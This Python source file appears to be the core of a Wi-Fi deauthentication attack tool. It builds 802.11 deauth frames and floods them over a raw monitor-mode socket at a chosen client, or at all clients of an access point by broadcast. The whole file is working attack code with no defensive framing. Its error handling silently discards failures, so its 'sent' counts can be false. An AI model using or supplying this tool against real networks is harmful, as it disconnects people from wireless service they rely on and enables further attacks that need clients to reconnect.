"""WiFi Deauth Core Engine"""
import struct, socket, os, time, json
from datetime import datetime

class DeauthFrame:
    """IEEE 802.11 Deauthentication Frame Builder"""
    FRAME_TYPE = 0xC0  # Deauth subtype
    
    @staticmethod
    def build(target_mac, ap_mac, reason=7):
        """Build a deauthentication frame"""
        frame = struct.pack("B", DeauthFrame.FRAME_TYPE)
        frame += struct.pack("B", 0x00)  # Flags
        frame += struct.pack("<H", 0)     # Duration
        frame += DeauthFrame._mac_bytes(target_mac)
        frame += DeauthFrame._mac_bytes(ap_mac)
        frame += DeauthFrame._mac_bytes(ap_mac)
        frame += struct.pack("<H", 0)     # Sequence
        frame += struct.pack("<H", reason)
        return frame
    
    @staticmethod
    def _mac_bytes(mac_str):
        return bytes.fromhex(mac_str.replace(":", ""))

class DeauthEngine:
    def __init__(self, config):
        self.config = config
        self.stats = {"packets_sent": 0, "targets": set(), "start_time": None}
    
    def deauth(self, target_mac, ap_mac, count=None, reason=None):
        count = count or self.config.PACKET_COUNT
        reason = reason or self.config.DEFAULT_REASON
        self.stats["start_time"] = datetime.now()
        self.stats["targets"].add(target_mac)
        
        frame = DeauthFrame.build(target_mac, ap_mac, reason)
        print(f"[*] Deauth: {target_mac} via {ap_mac} (reason={reason}, count={count})")
        
        for i in range(count):
            self._send_frame(frame)
            self.stats["packets_sent"] += 1
            if i % 10 == 0:
                print(f"  Sent {i}/{count} frames", end="\r")
            time.sleep(self.config.INTERVAL)
        print(f"\n[+] Sent {count} deauth frames to {target_mac}")
    
    def mass_deauth(self, ap_mac, count=None):
        """Deauth all clients from an AP (broadcast)"""
        self.deauth(self.config.BROADCAST, ap_mac, count)
    
    def _send_frame(self, frame):
        """Send raw frame (requires monitor mode)"""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((self.config.MONITOR_INTERFACE, 0))
            sock.send(frame)
            sock.close()
        except PermissionError:
            pass  # Requires root
        except Exception:
            pass
    
    def get_stats(self):
        return {"packets_sent": self.stats["packets_sent"],
                "targets": len(self.stats["targets"]),
                "duration": str(datetime.now() - self.stats["start_time"]) if self.stats["start_time"] else "0"}
